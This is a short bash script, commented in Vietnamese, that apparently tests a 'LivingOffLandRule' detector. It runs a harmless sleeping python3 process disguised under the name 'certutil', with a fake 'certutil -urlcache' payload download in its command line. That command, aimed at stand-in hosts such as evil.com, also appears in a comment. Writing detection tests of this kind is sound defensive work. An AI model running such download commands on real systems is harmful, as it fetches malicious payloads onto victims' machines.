#!/usr/bin/env bash
# ==============================================================================
# Rule: LivingOffLandRule
# Description: Kích hoạt cảnh báo LOLBins Abuse bằng cách gọi certutil/powershell với tham số đáng ngờ (-urlcache)
# Duration: >= 60 giây (mặc định 70s)
# ==============================================================================

DURATION=70

echo "[+] [LivingOffLandRule] Bắt đầu mô phỏng lạm dụng công cụ hệ thống (LOLBins)..."

cleanup() {
    echo -e "\n[+] Dọn dẹp tiến trình LOLBins..."
    pkill -f "certutil" 2>/dev/null || true
    pkill -f "urlcache" 2>/dev/null || true
}
trap cleanup EXIT INT TERM

echo "[+] Thực thi tiến trình LOLBin (certutil) với tham số tải xuống đáng ngờ..."

# Thực thi lệnh dạng LOLBin signature: certutil -urlcache -f http://evil.com/payload.exe
bash -c "exec -a 'certutil' python3 -c 'import time; # certutil -urlcache -f http://evil-domain.local/payload.bin; time.sleep(70)'" &
LOL_PID=$!

echo "[+] Tiến trình LOLBin (PID: $LOL_PID) đang chạy trong ${DURATION} giây..."
sleep $DURATION

echo "[+] [LivingOffLandRule] Mô phỏng kết thúc thành công."
